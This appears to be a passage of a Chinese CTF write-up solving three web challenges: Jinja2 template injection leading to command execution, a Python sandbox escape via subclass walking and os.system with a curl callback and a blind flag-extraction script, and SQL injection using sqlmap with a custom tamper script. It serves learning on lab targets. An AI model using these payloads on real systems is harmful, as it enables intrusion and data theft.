我知道了! 答案是 {'__name__': 'builtins', '__doc__': "Built-in functions, types, exceptions, and other objects.\n\nThis module provides direct access to all 'built-in'\nidentifiers of Python; for example, builtins.len is\nthe full name for the built-in function len().\n\nThis module is not normally accessed explicitly by most\napplications, but can be useful in modules that provide\nobjects with the same name as a built-in value, but in\nwhich the built-in of that name is also needed.", '__package__': '', '__loader__': <class '_frozen_importlib.BuiltinImporter'>, '__spec__': ModuleSpec(name='builtins', loader=<class '_frozen_importlib.BuiltinImporter'>, origin='built-in'), '__build_class__': <built-in function __build_class__>, '__import__': <built-in function __import__>, 'abs': <built-in function abs>, 'all': <built-in function all>, 'any': <built-in function any>, 'ascii': <built-in function ascii>, 'bin': <built-in function bin>, 'breakpoint': <built-in function breakpoint>, 'callable': <built-in function callable>, 'chr': <built-in function chr>, 'compile': <built-in function compile>, 'delattr': <built-in function delattr>, 'dir': <built-in function dir>, 'divmod': <built-in function divmod>, 'eval': <built-in function eval>, 'exec': <built-in function exec>, 'format': <built-in function format>, 'getattr': <built-in function getattr>, 'globals': <built-in function globals>, 'hasattr': <built-in function hasattr>, 'hash': <built-in function hash>, 'hex': <built-in function hex>, 'id': <built-in function id>, 'input': <built-in function input>, 'isinstance': <built-in function isinstance>, 'issubclass': <built-in function issubclass>, 'iter': <built-in function iter>, 'aiter': <built-in function aiter>, 'len': <built-in function len>, 'locals': <built-in function locals>, 'max': <built-in function max>, 'min': <built-in function min>, 'next': <built-in function next>, 'anext': <built-in function anext>, 'oct': <built-in function oct>, 'ord': <built-in function ord>, 'pow': <built-in function pow>, 'print': <built-in function print>, 'repr': <built-in function repr>, 'round': <built-in function round>, 'setattr': <built-in function setattr>, 'sorted': <built-in function sorted>, 'sum': <built-in function sum>, 'vars': <built-in function vars>, 'None': None, 'Ellipsis': Ellipsis, 'NotImplemented': NotImplemented, 'False': False, 'True': True, 'bool': <class 'bool'>, 'memoryview': <class 'memoryview'>, 'bytearray': <class 'bytearray'>, 'bytes': <class 'bytes'>, 'classmethod': <class 'classmethod'>, 'complex': <class 'complex'>, 'dict': <class 'dict'>, 'enumerate': <class 'enumerate'>, 'filter': <class 'filter'>, 'float': <class 'float'>, 'frozenset': <class 'frozenset'>, 'property': <class 'property'>, 'int': <class 'int'>, 'list': <class 'list'>, 'map': <class 'map'>, 'object': <class 'object'>, 'range': <class 'range'>, 'reversed': <class 'reversed'>, 'set': <class 'set'>, 'slice': <class 'slice'>, 'staticmethod': <class 'staticmethod'>, 'str': <class 'str'>, 'super': <class 'super'>, 'tuple': <class 'tuple'>, 'type': <class 'type'>, 'zip': <class 'zip'>, '__debug__': True, 'BaseException': <class 'BaseException'>, 'BaseExceptionGroup': <class 'BaseExceptionGroup'>, 'Exception': <class 'Exception'>, 'GeneratorExit': <class 'GeneratorExit'>, 'KeyboardInterrupt': <class 'KeyboardInterrupt'>, 'SystemExit': <class 'SystemExit'>, 'ArithmeticError': <class 'ArithmeticError'>, 'AssertionError': <class 'AssertionError'>, 'AttributeError': <class 'AttributeError'>, 'BufferError': <class 'BufferError'>, 'EOFError': <class 'EOFError'>, 'ImportError': <class 'ImportError'>, 'LookupError': <class 'LookupError'>, 'MemoryError': <class 'MemoryError'>, 'NameError': <class 'NameError'>, 'OSError': <class 'OSError'>, 'ReferenceError': <class 'ReferenceError'>, 'RuntimeError': <class 'RuntimeError'>, 'StopAsyncIteration': <class 'StopAsyncIteration'>, 'StopIteration': <class 'StopIteration'>, 'SyntaxError': <class 'SyntaxError'>, 'SystemError': <class 'SystemError'>, 'TypeError': <class 'TypeError'>, 'ValueError': <class 'ValueError'>, 'Warning': <class 'Warning'>, 'FloatingPointError': <class 'FloatingPointError'>, 'OverflowError': <class 'OverflowError'>, 'ZeroDivisionError': <class 'ZeroDivisionError'>, 'BytesWarning': <class 'BytesWarning'>, 'DeprecationWarning': <class 'DeprecationWarning'>, 'EncodingWarning': <class 'EncodingWarning'>, 'FutureWarning': <class 'FutureWarning'>, 'ImportWarning': <class 'ImportWarning'>, 'PendingDeprecationWarning': <class 'PendingDeprecationWarning'>, 'ResourceWarning': <class 'ResourceWarning'>, 'RuntimeWarning': <class 'RuntimeWarning'>, 'SyntaxWarning': <class 'SyntaxWarning'>, 'UnicodeWarning': <class 'UnicodeWarning'>, 'UserWarning': <class 'UserWarning'>, 'BlockingIOError': <class 'BlockingIOError'>, 'ChildProcessError': <class 'ChildProcessError'>, 'ConnectionError': <class 'ConnectionError'>, 'FileExistsError': <class 'FileExistsError'>, 'FileNotFoundError': <class 'FileNotFoundError'>, 'InterruptedError': <class 'InterruptedError'>, 'IsADirectoryError': <class 'IsADirectoryError'>, 'NotADirectoryError': <class 'NotADirectoryError'>, 'PermissionError': <class 'PermissionError'>, 'ProcessLookupError': <class 'ProcessLookupError'>, 'TimeoutError': <class 'TimeoutError'>, 'IndentationError': <class 'IndentationError'>, 'IndexError': <class 'IndexError'>, 'KeyError': <class 'KeyError'>, 'ModuleNotFoundError': <class 'ModuleNotFoundError'>, 'NotImplementedError': <class 'NotImplementedError'>, 'RecursionError': <class 'RecursionError'>, 'UnboundLocalError': <class 'UnboundLocalError'>, 'UnicodeError': <class 'UnicodeError'>, 'BrokenPipeError': <class 'BrokenPipeError'>, 'ConnectionAbortedError': <class 'ConnectionAbortedError'>, 'ConnectionRefusedError': <class 'ConnectionRefusedError'>, 'ConnectionResetError': <class 'ConnectionResetError'>, 'TabError': <class 'TabError'>, 'UnicodeDecodeError': <class 'UnicodeDecodeError'>, 'UnicodeEncodeError': <class 'UnicodeEncodeError'>, 'UnicodeTranslateError': <class 'UnicodeTranslateError'>, 'ExceptionGroup': <class 'ExceptionGroup'>, 'EnvironmentError': <class 'OSError'>, 'IOError': <class 'OSError'>, 'open': <built-in function open>, 'quit': Use quit() or Ctrl-D (i.e. EOF) to exit, 'exit': Use exit() or Ctrl-D (i.e. EOF) to exit, 'copyright': Copyright (c) 2001-2023 Python Software Foundation. All Rights Reserved. Copyright (c) 2000 BeOpen.com. All Rights Reserved. Copyright (c) 1995-2001 Corporation for National Research Initiatives. All Rights Reserved. Copyright (c) 1991-1995 Stichting Mathematisch Centrum, Amsterdam. All Rights Reserved., 'credits': Thanks to CWI, CNRI, BeOpen, Zope Corporation, the Python Software Foundation, and a cast of thousands for supporting Python development. See www.python.org for more information., 'license': Type license() to see the full license text, 'help': Type help() for interactive help, or help(object) for help about object.} !哼哼, 不愧是我~
```

发现其中有 eval。尝试构造 RCE

```txt
{{ self.__init__.__globals__.__builtins__['eval']("__import__('subprocess').getoutput('ls -la .')") }}

竟敢小看最强的我, 我要把你冻起来!

eval

竟敢小看最强的我, 我要把你冻起来!

subprocess

竟敢小看最强的我, 我要把你冻起来!

{{ self.__init__.__globals__.__builtins__['ev'+'al']("__import__('sub'+'process').getoutput('ls -la .')") }}

我知道了! 答案是 
total 24 
drwxr-xr-x 1 root root 4096 Aug 18 09:30 . 
drwxr-xr-x 1 root root 4096 Aug 19 04:58 .. 
-rwxrwxrwx 1 root root 161 Aug 18 09:29 Dockerfile 
-rwxrwxrwx 1 root root 953 Jul 21 10:06 app.py 
drwxrwxrwx 2 root root 4096 Jul 21 08:30 static 
drwxrwxrwx 2 root root 4096 Jul 21 08:12 templates 
!哼哼, 不愧是我~
```

那可以直接看源码了。

```python
# {{ self.__init__.__globals__.__builtins__['ev'+'al']("__import__('sub'+'process').getoutput('cat app.py')") }}

from flask import Flask, request, jsonify, render_template, render_template_string 
from flask_cors import CORS 
import sys 

app = Flask(__name__) 

CORS(app) 

blacklist=["os", "sys", "subprocess", "eval", "exec", "subclasses"] 

@app.route("/") 
def index(): 
    return render_template("index.html") 

@app.route("/calc", methods=["POST"]) 
def calc(): 
    expression = request.form.get("expression") 
    if not expression: 
        return "你都还没给我算式!哼,别想耍我~", 400 
    for i in blacklist:
        if i in expression: 
            return "竟敢小看最强的我, 我要把你冻起来!" 
    try: template_string = f"我知道了! 答案是 {expression} !哼哼, 不愧是我~" 
        return render_template_string(template_string) 
    except Exception as e: print(e) 
        return "是9!一定是9!", 500 

if __name__ == '__main__': 
    app.run(debug=True, host='0.0.0.0', port=9999)
```

看一下根目录

```txt
{{ self.__init__.__globals__.__builtins__['ev'+'al']("__import__('sub'+'process').getoutput('ls /')") }}
琪露诺
我知道了! 答案是 app bin boot dev etc fL1G_9 home lib lib64 media mnt opt proc root run sbin srv sys tmp usr var !哼哼, 不愧是我~

{{ self.__init__.__globals__.__builtins__['ev'+'al']("__import__('sub'+'process').getoutput('ls -la /')") }}
琪露诺
我知道了! 答案是 
total 68 
drwxr-xr-x 1 root root 4096 Aug 19 04:58 . 
drwxr-xr-x 1 root root 4096 Aug 19 04:58 .. 
drwxr-xr-x 1 root root 4096 Aug 18 09:30 app 
lrwxrwxrwx 1 root root 7 May 12 19:25 bin -> usr/bin 
drwxr-xr-x 2 root root 4096 May 12 19:25 boot 
drwxr-xr-x 5 root root 360 Aug 19 04:58 dev 
drwxr-xr-x 1 root root 4096 Aug 19 04:58 etc 
-rwxrwxrwx 1 root root 32 Jul 21 10:15 fL1G_9 
drwxr-xr-x 2 root root 4096 May 12 19:25 home 
lrwxrwxrwx 1 root root 7 May 12 19:25 lib -> usr/lib 
lrwxrwxrwx 1 root root 9 May 12 19:25 lib64 -> usr/lib64 
drwxr-xr-x 2 root root 4096 Aug 11 00:00 media 
drwxr-xr-x 2 root root 4096 Aug 11 00:00 mnt 
drwxr-xr-x 2 root root 4096 Aug 11 00:00 opt 
dr-xr-xr-x 1373 root root 0 Aug 19 04:58 proc 
drwx------ 1 root root 4096 Aug 18 09:29 root 
drwxr-xr-x 1 root root 4096 Aug 19 04:58 run 
lrwxrwxrwx 1 root root 8 May 12 19:25 sbin -> usr/sbin 
drwxr-xr-x 2 root root 4096 Aug 11 00:00 srv 
dr-xr-xr-x 13 root root 0 Aug 19 04:45 sys 
drwxrwxrwt 1 root root 4096 Aug 18 09:30 tmp 
drwxr-xr-x 1 root root 4096 Aug 11 00:00 usr 
drwxr-xr-x 1 root root 4096 Aug 11 00:00 var 
!哼哼, 不愧是我~

{{ self.__init__.__globals__.__builtins__['ev'+'al']("__import__('sub'+'process').getoutput('/fL1G_9')") }}
我知道了! 答案是 /fL1G_9: 1: VIDAR{Y0u_aR3_a_ReA1_G3n1Us_!!!}: not found !哼哼, 不愧是我~
```

## 红魔馆

```python
from flask import Flask, request
import multiprocessing
import sys
import io
import ast

class SandboxVisitor(ast.NodeVisitor):
    def visit_Import(self, node):
        raise SyntaxError("找不到外援呜呜呜")

    def visit_ImportFrom(self, node):
        raise SyntaxError("找不到外援呜呜呜")

def sandbox_executor(code_to_exec, result_queue):
    original_stdout = sys.stdout
    original_stderr = sys.stderr

    sys.stdout = io.StringIO()
    sys.stderr = io.StringIO()

    limited_builtins = {
        "print": print,
        "len": len,
        "str": str,
        "int": int,
        "float": float,
        "bool": bool,
        "list": list,
        "tuple": tuple,
        "dict": dict,
        "set": set,
        "range": range,
        "sum": sum,
        "max": max,
        "min": min,
        "abs": abs,
        "divmod": divmod,
        "round": round,
        "all": all,
        "any": any,
        "chr": chr,
        "ord": ord,
        "bin": bin,
        "hex": hex,
        "oct": oct,
        "id": id,
        "type": type,
        "RuntimeError": RuntimeError,
        "Exception": Exception
    }

    def my_audit_checker(event, args):
        blocked_events = [
            "import", "subprocess.Popen", "socket.socket", "open",
            "builtins.eval", "builtins.exec", "builtins.__import__"
        ]
        if event.startswith("os.path") or event.startswith("io.file"):
             raise RuntimeError(f"做不到这个: {event}")
        if event in blocked_events or event.startswith("subprocess."):
            raise RuntimeError(f"做不到这个: {event}")

    try:
        sys.addaudithook(my_audit_checker)
    except RuntimeError:
        pass

    try:
        exec(code_to_exec, {'__builtins__': limited_builtins})
        output = sys.stdout.getvalue()
        print(output)
        result_queue.put(("ok", output))
    except Exception as e:
        result_queue.put(("error", str(e)))
    finally:
        sys.stdout = original_stdout
        sys.stderr = original_stderr

def safe_exec(code: str, timeout=1):
    try:
        code = code.encode().decode('unicode_escape')
    except UnicodeDecodeError:
        return "Error: Invalid unicode escape sequence."

    try:
        tree = ast.parse(code)
        SandboxVisitor().visit(tree)
    except (SyntaxError, ValueError) as e:
        return f"这个,做不到啊: {str(e)}"

    result_queue = multiprocessing.Queue()
    p = multiprocessing.Process(target=sandbox_executor, args=(code, result_queue))
    p.start()
    p.join(timeout=timeout)

    if p.is_alive():
        p.terminate()
        return "花了太久时间来执行了..."
    try:
        status, output = result_queue.get_nowait()
        return output if status == "ok" else f"这样似乎不行: {output}"
    except multiprocessing.queues.Empty:
        return "好像没有产生任何回应呢..."
    except Exception as e:
        return f"发生了一些意料之外的事: {str(e)}"

app = Flask(__name__)

@app.errorhandler(500)
def internal_server_error(e):
    return "ERROR", 500

@app.route("/", methods=["GET"])
def index():
    return """
    帮帮魔理沙,找到逃出红魔馆的路吧⭐
    """

@app.route("/exec", methods=["POST"])
def exec_code_endpoint():
    code = request.form.get("code")
    if not code:
        return "No code provided", 400
    result = safe_exec(code, timeout=2)
    
    return result, 200

if __name__ == "__main__":
    print("Server running on http://127.0.0.1:5000/")
    app.run(host='0.0.0.0', port=5000)
    
```

```python
print([i for i, c in enumerate(int.__mro__[1].__subclasses__()) if 'Popen' in str(c)])
# 这样似乎不行: name 'enumerate' is not defined

# 用沙箱内的函数实现 enumerate
print([i for i in range(len(int.__mro__[1].__subclasses__())) if 'subprocess.Popen' in str(int.__mro__[1].__subclasses__()[i])])
# [351]

print([i for i in range(len(int.__mro__[1].__subclasses__())) if 'enumerate' in str(int.__mro__[1].__subclasses__()[i])])
# [32]

print(int.__mro__[1].__subclasses__()[351]('cat /flag', shell=True, stdout=-1).communicate()[0].decode('utf-8'))
# 这样似乎不行: 做不到这个: open
```

SandboxVisitor 这个类，就是直接定义在主程序脚本的顶层。这意味着，它的任何一个方法（比如 visit_Import），其 __globals__ 属性都会直接指向主程序的全局命名空间

```python
print([i for i in range(len(().__class__.__base__.__subclasses__())) if 'SandboxVisitor' in ().__class__.__base__.__subclasses__()[i].__name__])
# []
```

这个 payload 没有返回任何东西.

代码首先在主进程中被 ast.parse() 解析。

SandboxVisitor().visit(tree) 也在主进程中运行，用来检查 import 语句。

然后，程序创建了一个新的子进程 (p = multiprocessing.Process(...)) 来执行 sandbox_executor 函数。

payload 是在 exec() 中，也就是在那个新的子进程里运行的

SandboxVisitor 这个类是在主进程中定义和使用的。当子进程被创建时，它虽然继承了代码，但它的内存空间和加载的类是相对独立的。由于 SandboxVisitor 类从未在子进程的代码路径中被直接引用或实例化，Python 的垃圾回收机制可能已经清理了它，或者它根本就没有被完全加载到子进程的 __subclasses__ 列表里。

```python
print([i for i in range(len(int.__mro__[1].__subclasses__())) if '_wrap_close' in str(int.__mro__[1].__subclasses__()[i])])
# [132]

print(int.__mro__[1].__subclasses__()[132].__init__.__globals__['popen']('cat /flag').read())
# 这样似乎不行: 做不到这个: open

# ~/.local/share/uv/python/cpython-3.8.20-linux-x86_64-gnu/lib/python3.8/os.py
def popen(cmd, mode="r", buffering=-1):
    if not isinstance(cmd, str):
        raise TypeError("invalid cmd type (%s, expected string)" % type(cmd))
    if mode not in ("r", "w"):
        raise ValueError("invalid mode %r" % mode)
    if buffering == 0 or buffering is None:
        raise ValueError("popen() does not support unbuffered streams")
    import subprocess, io
    if mode == "r":
        proc = subprocess.Popen(cmd,
                                shell=True,
                                stdout=subprocess.PIPE,
                                bufsize=buffering)
        return _wrap_close(io.TextIOWrapper(proc.stdout), proc)
    else:
        proc = subprocess.Popen(cmd,
                                shell=True,
                                stdin=subprocess.PIPE,
                                bufsize=buffering)
        return _wrap_close(io.TextIOWrapper(proc.stdin), proc)

# Helper for popen() -- a proxy for a file whose close waits for the process
class _wrap_close:
    def __init__(self, stream, proc):
        self._stream = stream
        self._proc = proc
    def close(self):
        self._stream.close()
        returncode = self._proc.wait()
        if returncode == 0:
            return None
        if name == 'nt':
            return returncode
        else:
            return returncode << 8  # Shift left to match old behavior
    def __enter__(self):
        return self
    def __exit__(self, *args):
        self.close()
    def __getattr__(self, name):
        return getattr(self._stream, name)
    def __iter__(self):
        return iter(self._stream)
```

发现 通过 _wrap_close 访问到的 popen 同样是使用 subprocess.Popen 实现，在这个过程中会触发 open

我们不需要关心父进程中的 SandboxVisitor，因为我们的代码最终是在子进程中 exec 的。我们需要攻击的是子进程中的安全措施。

既然 sys.addaudithook 是最终的防线，那么我们能不能在执行恶意代码（比如 Popen）之前，先把这个钩子给干掉呢？

sys.addaudithook 添加的钩子函数都存储在一个列表里：sys.audit_hooks。如果我们能拿到 sys 模块的引用，然后执行 sys.audit_hooks.clear()，那么所有的运行时安全检查就都失效了

虽然 limited_builtins 里没有 sys，但Python进程启动时，为了正常运行，已经加载了很多标准库模块。这些模块中的类，以及这些类所持有的 __globals__（全局变量字典），就是我们的把手

__globals__ 属性是一个包含了函数或类所在模块所有全局变量的字典。如果我们可以找到一个已经加载的、属于标准库的类，那么通过它的 __globals__ 属性，我们就能访问到那个模块导入的所有其他模块，其中通常就包括 sys

一个很常见的“跳板”是 warnings.catch_warnings 类，因为它基本上总会被加载。

```python
print([i for i in range(len(().__class__.__base__.__subclasses__())) if 'catch_warnings' in ().__class__.__base__.__subclasses__()[i].__name__])
# [222]


w_class = [c for c in ().__class__.__base__.__subclasses__() if c.__name__ == 'catch_warnings'][0]
s_module = w_class.__init__.__globals__['sys']
s_module.audit_hooks.clear()
p_class = [c for c in ().__class__.__base__.__subclasses__() if c.__name__ == 'Popen'][0]
print(p_class('cat /flag', shell=True, stdout=-1).communicate()[0].decode())

print([c for c in ().__class__.__base__.__subclasses__() if c.__name__ == 'catch_warnings'][0])
# <class 'warnings.catch_warnings'>

print([c for c in ().__class__.__base__.__subclasses__() if c.__name__ == 'catch_warnings'][0].__init__.__globals__['sys'])
# <module 'sys' (built-in)>

print([c for c in ().__class__.__base__.__subclasses__() if c.__name__ == 'catch_warnings'][0].__init__.__globals__['sys'].audit_hooks.clear())
# 这样似乎不行: module 'sys' has no attribute 'audit_hooks'
```

在这个特定的 Python 版本中，sys.addaudithook() 函数存在（所以服务器代码没有崩溃，并且成功加上了钩子），但是用来查看和修改钩子列表的 sys.audit_hooks 属性不存在

```python
code=print([c for c in ().__class__.__base__.__subclasses__() if c.__name__ == '_wrap_close'][0].__init__.__globals__['__builtins__']['__import__']('os').system('$(cat /flag)'))
# 32512
```

发送的 payload 调用了 os.system() 并打印了它的返回值。在 Linux 系统上，os.system() 的返回值是命令的退出状态码经过位移运算后的结果。

我们执行的命令是 $(cat /flag)。

Shell 无法找到名为 flag 内容的命令，因此退出码是 127 (command not found)。

os.system 将这个退出码 127 左移8位，即 127 << 8。

127 * 256 = 32512。

output = sys.stdout.getvalue() 这一行。代码只获取了标准输出 (stdout) 的内容，而完全忽略了标准错误 (stderr) 的内容

```python
code=[c for c in ().__class__.__base__.__subclasses__() if c.__name__ == '_wrap_close'][0].__init__.__globals__['__builtins__']['__import__']('os').system('cat /flag')
# 无返回

# 终端中
VIDAR{marisa_need_your_help!!!}192.168.3.217 - - [20/Aug/2025 13:51:35] "POST /exec HTTP/1.1" 200 

```

成功执行了，已经得到了一个无回显RCE. 现在需要想办法把它弄到http返回里

试了下curl能用，直接用ceye.io远程回显了

```text
POST /exec HTTP/1.1
Host: hgame.vidar.club:44220
Accept-Language: zh-CN,zh;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Content-Length: 171
Content-Type: application/x-www-form-urlencoded

code=[c for c in ().__class__.__base__.__subclasses__() if c.__name__ == '_wrap_close'][0].__init__.__globals__['__builtins__']['__import__']('os').system('curl http://ip.port.xxxxxx.ceye.io/vidar')

```

自己机器上开开心心拿到flag了，到靶场发现靶机不能访问外网。所以我们现在使用盲注。

```python
code=print([c for c in ().__class__.__base__.__subclasses__() if c.__name__ == '_wrap_close'][0].__init__.__globals__['__builtins__']['__import__']('os').system('$(test "$(cat /flag | cut -c 1)" = "V")'))
# 0

code=print([c for c in ().__class__.__base__.__subclasses__() if c.__name__ == '_wrap_close'][0].__init__.__globals__['__builtins__']['__import__']('os').system('$(test "$(cat /flag | cut -c 1)" = "a")'))
# 256
```

现在用这个 RCE 做一个脚本，排出flag。

```python
import requests
import string
import time
import sys

TARGET_URL = "http://localhost:5000/exec"

def test_char(position, char, target_url=TARGET_URL):
    """测试flag指定位置的字符是否为给定字符"""
    # 构造盲注payload
    flag_path = "/flag"
    payload = f'print([c for c in ().__class__.__base__.__subclasses__() if c.__name__ == \'_wrap_close\'][0].__init__.__globals__[\'__builtins__\'][\'__import__\'](\'os\').system(\'$(test "$(cat {flag_path} | cut -c {position})" = "{char}")\'))'
    
    data = {'code': payload}
    
    # 用 burpsuite 避免一些奇怪的网络问题
    proxies = {
    'http': 'http://127.0.0.1:8080',
    'https': 'http://127.0.0.1:8080',
    }

    try:
        response = requests.post(
            target_url,
            data=data,
            proxies=proxies,
            verify=False,
            headers={
                'Accept-Language': 'zh-CN,zh;q=0.9',
                'Upgrade-Insecure-Requests': '1',
                'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36',
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                'Accept-Encoding': 'gzip,deflate, br',
                'Connection': 'keep-alive',
                'Content-Type': 'application/x-www-form-urlencoded',
                'Sec-Fetch-Site': 'none',
                'Sec-Fetch-Mode': 'navigate',
                'Sec-Fetch-Dest': 'document',
            }
        )
        
        # 如果响应中包含0，说明测试成功(命令返回码为0)
        if '0' in response.text:
            return True
        return False
        
    except Exception as e:
        print(f"Error testing char '{char}' at position {position}: {e}")
        return False

def extract_flag(target_url=TARGET_URL):
    """提取完整的flag"""
    flag = ""
    position = 6
    
    charset = "{}" + string.ascii_letters + string.digits + "_-@!#$%^&*()+=[]|:;\"'<>,.?/"
    
    print("开始盲注flag...")
    print("测试字符集:", charset)
    
    while True:
        found_char = None
        
        print(f"\n正在测试位置 {position}...")
        
        # 遍历所有可能的字符
        for char in charset:
            if test_char(position, char, target_url):
                found_char = char
                flag += char
                print(f"✓ 找到字符: '{char}'")
                print(f"当前flag: {flag}")
                break
            else:
                pass
            
            # 添加延时避免请求过快
            time.sleep(0.05)
        
        if found_char is None:
            print(f"位置 {position} 没有找到匹配的字符，可能已到达flag末尾")
            break
        
        # 如果找到了结束符号}，说明flag提取完成
        if found_char == '}':
            print(f"\n✓ Flag提取完成: {flag}")
            break
        
        position += 1
        
        # 防止无限循环
        if position > 100:
            print("达到最大长度限制，停止搜索")
            break
    
    return flag

def main():
    print("=== Flag盲注提取工具 ===")
    
    # 允许用户通过命令行参数指定URL
    target_url = TARGET_URL
    if len(sys.argv) > 1:
        target_url = sys.argv[1]
    
    print(f"目标URL: {target_url}")
    print("RCE payload已配置")
    
    try:
        flag = extract_flag(target_url)
        if flag:
            print(f"\n最终flag: {flag}")
        else:
            print("\n未能提取到flag")
    except KeyboardInterrupt:
        print("\n\n中断执行")
    except Exception as e:
        print(f"\n执行出错: {e}")

if __name__ == "__main__":
    main()

# ✓ Flag提取完成: {marisa_need_your_help!!!}

# 最终flag: {marisa_need_your_help!!!}
```

## sqli 2

过滤了`information_schema`的`infor`, 默认的randomcase.py并不会处理information_schema。这里重新自己写一个脚本，用简单大小写替换绕过。

```python
#!/usr/bin/env python

"""
Copyright (c) 2006-2025 sqlmap developers (https://sqlmap.org/)
See the file 'LICENSE' for copying permission
"""

import re

from lib.core.common import randomRange
from lib.core.compat import xrange
from lib.core.data import kb
from lib.core.enums import PRIORITY

__priority__ = PRIORITY.NORMAL

def dependencies():
    pass

# 改成自定义的 keywords 
keywords = ("UNION", "SELECT", "FROM", "WHERE", "LIMIT", "ORDER BY", "GROUP BY", "HAVING", "INFORMATION_SCHEMA", "TABLE_SCHEMA", "TABLE_NAME", "COLUMN_NAME", "AND")

def tamper(payload, **kwargs):
    """
    Replaces each keyword character with random case value (e.g. SELECT -> SEleCt)

    Tested against:
        * Microsoft SQL Server 2005
        * MySQL 4, 5.0 and 5.5
        * Oracle 10g
        * PostgreSQL 8.3, 8.4, 9.0
        * SQLite 3

    Notes:
        * Useful to bypass very weak and bespoke web application firewalls
          that has poorly written permissive regular expressions
        * This tamper script should work against all (?) databases

    >>> import random
    >>> random.seed(0)
    >>> tamper('INSERT')
    'InSeRt'
    >>> tamper('f()')
    'f()'
    >>> tamper('function()')
    'FuNcTiOn()'
    >>> tamper('SELECT id FROM `user`')
    'SeLeCt id FrOm `user`'
    """

    retVal = payload

    if payload:
        for match in re.finditer(r"\b[A-Za-z_]{2,}\b", retVal):
            word = match.group()

            if (word.upper() in keywords and re.search(r"(?i)[`\"'\[]%s[`\"'\]]" % word, retVal) is None) or ("%s(" % word) in payload:
                while True:
                    _ = ""

                    for i in xrange(len(word)):
                        _ += word[i].upper() if randomRange(0, 1) else word[i].lower()

                    if len(_) > 1 and _ not in (_.lower(), _.upper()):
                        break

                retVal = retVal.replace(word, _)

    return retVal

```

除了 information_schema, 还过滤了`-`,`=`,以及常见的一些关键字。sqlmap构造非法输入会首先试图使用负数id，我们不希望带上负数id的`-`，所以加上`--invalid-string`参数。它会使用非法字符串而不是非法id。使用`#`结尾。

```shell
$ sqlmap -u "http://hgame.vidar.club:42368/books/0*" --tamper=equaltolike,"/home/veno/.local/share/sqlmap/tamper/randomcase.py" --risk=3 --level=5 --string="Vidar-Team" --prefix="'" --suffix="%23" --invalid-string -v 1 --batch --dbs

# [12:56:32] [INFO] retrieved: 'book'
# available databases [1]:
# [*] book

$ sqlmap -u "http://hgame.vidar.club:42368/books/0*" --tamper=equaltolike,"/home/veno/.local/share/sqlmap/tamper/randomcase.py" --risk=3 --level=5 --string="Vidar-Team" --prefix="'" --suffix="%23" --invalid-string -v 0 --batch -D book --tables

# sqlmap resumed the following injection point(s) from stored session:
# ---
# Parameter: #1* (URI)
#     Type: error-based
#     Title: MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)
#     Payload: http://hgame.vidar.club:42368/books/0' AND GTID_SUBSET(CONCAT(0x71706b7171,(SELECT (ELT(5251=5251,1))),0x71626a7671),5251)#

#     Type: time-based blind
#     Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
#     Payload: http://hgame.vidar.club:42368/books/0' AND (SELECT 3581 FROM (SELECT(SLEEP(5)))hmXD)#

#     Type: UNION query
#     Title: Generic UNION query (random number) - 3 columns
#     Payload: http://hgame.vidar.club:42368/books/0' UNION ALL SELECT 2796,CONCAT(0x71706b7171,0x765a4b58495354544b5573744e72657673676b745170794167757965666877464a436e486b5a7775,0x71626a7671),2796#
# ---
# back-end DBMS: MySQL >= 5.6
# Database: book
# [2 tables]
# +------------------------+
# | books                  |
# | seeeeeeeeeeeeeeeecrret |
# +------------------------+

$ sqlmap -u "http://hgame.vidar.club:42368/books/0*" --tamper=equaltolike,"/home/veno/.local/share/sqlmap/tamper/randomcase.py" --risk=3 --level=5 --string="Vidar-Team" --prefix="'" --suffix="%23" --invalid-string -v 0 --batch -D book -T seeeeeeeeeeeeeeeecrret --columns

# sqlmap resumed the following injection point(s) from stored session:
# ---
# Parameter: #1* (URI)
#     Type: error-based
#     Title: MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)
#     Payload: http://hgame.vidar.club:42368/books/0' AND GTID_SUBSET(CONCAT(0x71706b7171,(SELECT (ELT(5251=5251,1))),0x71626a7671),5251)#

#     Type: time-based blind
#     Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
#     Payload: http://hgame.vidar.club:42368/books/0' AND (SELECT 3581 FROM (SELECT(SLEEP(5)))hmXD)#

#     Type: UNION query
#     Title: Generic UNION query (random number) - 3 columns
#     Payload: http://hgame.vidar.club:42368/books/0' UNION ALL SELECT 2796,CONCAT(0x71706b7171,0x765a4b58495354544b5573744e72657673676b745170794167757965666877464a436e486b5a7775,0x71626a7671),2796#
# ---
# back-end DBMS: MySQL >= 5.6
# Database: book
# Table: seeeeeeeeeeeeeeeecrret
# [1 column]
# +--------------------------------+-----------+
# | Column                         | Type      |
# +--------------------------------+-----------+
# | fllllllllllllllllllllllaaa444g | char(255) |
# +--------------------------------+-----------+

$ sqlmap -u "http://hgame.vidar.club:42368/books/0*" --tamper=equaltolike,"/home/veno/.local/share/sqlmap/tamper/randomcase.py" --risk=3 --level=5 --string="Vidar-Team" --prefix="'" --suffix="%23" --invalid-string -v 0 --batch -D book -T seeeeeeeeeeeeeeeecrret -C fllllllllllllllllllllllaaa444g --dump

# sqlmap resumed the following injection point(s) from stored session:
# ---
# Parameter: #1* (URI)
#     Type: error-based
#     Title: MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)
#     Payload: http://hgame.vidar.club:42368/books/0' AND GTID_SUBSET(CONCAT(0x71706b7171,(SELECT (ELT(5251=5251,1))),0x71626a7671),5251)#

#     Type: time-based blind
#     Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
#     Payload: http://hgame.vidar.club:42368/books/0' AND (SELECT 3581 FROM (SELECT(SLEEP(5)))hmXD)#

#     Type: UNION query
#     Title: Generic UNION query (random number) - 3 columns
